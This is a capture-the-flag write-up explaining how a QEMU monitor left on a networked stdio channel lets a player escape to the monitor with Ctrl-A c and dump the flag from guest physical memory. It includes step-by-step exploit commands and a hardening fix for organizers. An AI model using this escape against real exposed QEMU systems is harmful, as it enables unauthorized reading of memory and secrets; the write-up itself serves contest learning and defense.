# pwn/xv6 Writeup

## Summary

The intended-looking path (kernel privilege escalation inside xv6) was a decoy
for this instance. The practical break is a QEMU monitor escape exposed on the
same stdio channel as the challenge I/O.

Once in monitor mode, we can dump physical memory at the address where the
challenge loads the flag (`0x87fff000`), then decode bytes into ASCII.

Final flag:

```text
HCMUS-CTF{36_hours_is_not_enough_for_a_*real*_linux_kernel_CVE}
```

## Challenge Behavior

Remote endpoint:

```text
nc xv6.blackpinker.com 1337
```

From `public/chall.sh`, protocol is:

1. Read decimal byte length.
2. Read exactly that many raw bytes into `user/_init`.
3. Run `mkfs fs.img user/*`.
4. Boot QEMU for 8 seconds.

QEMU command includes:

```bash
-nographic
-device loader,file=flag.txt,addr=0x87fff000,force-raw=on
```

So `flag.txt` is mapped into guest physical memory at `0x87fff000`.

## Root Cause

`-nographic` leaves a serial/monitor multiplexer on stdio. Sending `Ctrl-A c`
switches from guest console to QEMU monitor.

In monitor mode, `xp` can inspect physical memory directly:

```text
xp /128bx 0x87fff000
```

That bypasses xv6 memory protections entirely.

## Minimal Exploit Flow

1. Upload any valid `_init` that keeps the VM alive briefly.
2. After boot output appears, send `Ctrl-A c`.
3. Run `xp /128bx 0x87fff000`.
4. Convert dumped bytes to ASCII and extract `...{...}`.

## Reproduction

### 1. Build a tiny looping init

```bash
cd problems/xv6/upstream-xv6
make TOOLPREFIX=riscv64-elf- user/_loop
```

(`user/loop.c` was added locally as a simple init that prints `loop ready` and
sleeps.)

### 2. Run the remote extractor (uv environment)

```bash
uv run python problems/xv6/solve_monitor.py
```

Optional explicit parameters:

```bash
uv run python problems/xv6/solve_monitor.py \
  --host xv6.blackpinker.com \
  --port 1337 \
  --payload problems/xv6/upstream-xv6/user/_loop \
  --addr 0x87fff000 \
  --dump-len 128
```

## Notes From Investigation

- Kernel patch only excludes the last page from `kalloc()`:
  `freerange(end, FLAG_PHYS)`.
- The stale-TLB/page-reuse hypothesis was tested locally and faulted as expected
  (no surviving stale user mapping after syscall return).
- No kernel-side copy primitive was required for the actual solve.

## Hardening Fix (Organizer Side)

To prevent this class of break:

1. Disable monitor on stdio:
   - use `-monitor none`, or
   - separate monitor away from the networked stdio path.
2. Keep guest serial only:
   - explicit `-serial mon:stdio` handling with monitor disabled, or
   - a dedicated pty/socket for monitor not exposed to players.
